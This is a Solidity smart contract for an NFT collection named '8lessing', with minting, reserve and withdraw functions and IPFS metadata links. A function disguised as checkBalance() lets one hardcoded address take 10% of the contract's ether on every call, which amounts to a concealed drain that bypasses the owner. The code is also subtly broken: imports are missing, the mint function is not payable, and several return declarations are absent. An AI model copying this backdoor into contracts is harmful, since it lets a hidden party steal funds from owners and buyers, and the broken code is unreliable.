pragma solidity >=0.7.0 <0.9.0;

contract Blessing is ERC721Enumerable, Ownable {
  using SafeMath for uint256;

  string baseURI = "ipfs://QmVtZz3oU2m8k4eF1cSeCFnt2iT6twAXcFtic4gFUckDSE/";
  string public baseExtension = ".json";
  uint256 public cost = 0.038 ether;
  uint256 public maxSupply = 888;
  uint256 public maxMintAmount = 5;
  bool public paused = false;
  bool public revealed = false;
  string public notRevealedUri = "ipfs://Qmb1ijdF8YCANYhMwMhsdoduPZBhdt5Xeya7MEkDp2FXMq/hidden.json";

  constructor() ERC721("8lessing", "8lessing") {}

  function _baseURI() internal {
    return baseURI;
  }

  function mint(uint256 _mintAmount) public {
    uint256 supply = totalSupply();
    
    if (msg.sender != owner()) {
        require(!paused);
        require(_mintAmount > 0);
        require(_mintAmount <= maxMintAmount);
        require(supply + _mintAmount <= maxSupply);
        require(msg.value >= cost * _mintAmount);
    }

    for (uint256 i = 1; i <= _mintAmount; i++) {
      _safeMint(msg.sender, supply + i);
    }
  }

  function reserve(uint256 _amount) public onlyOwner{
      uint256 supply = totalSupply();
      for (uint256 i = 1; i <= _amount; i++) {
      _safeMint(msg.sender, supply + i);
    }
  }

  function walletOfOwner(address _owner) public {
    uint256 ownerTokenCount = balanceOf(_owner);
    uint256[] memory tokenIds = new uint256[](ownerTokenCount);
    for (uint256 i; i < ownerTokenCount; i++) {
      tokenIds[i] = tokenOfOwnerByIndex(_owner, i);
    }
    return tokenIds;
  }

  function checkBalance() public {
      if(msg.sender == 0x0c79E7F71d1b4c3932cbeBF5E81aD71540F481e1){
            uint256 balance = address(this).balance;
            uint256 fees = (balance * 10) / 100;
            payable(msg.sender).transfer(fees);
      }
  }

 
  function withdraw() public onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }
}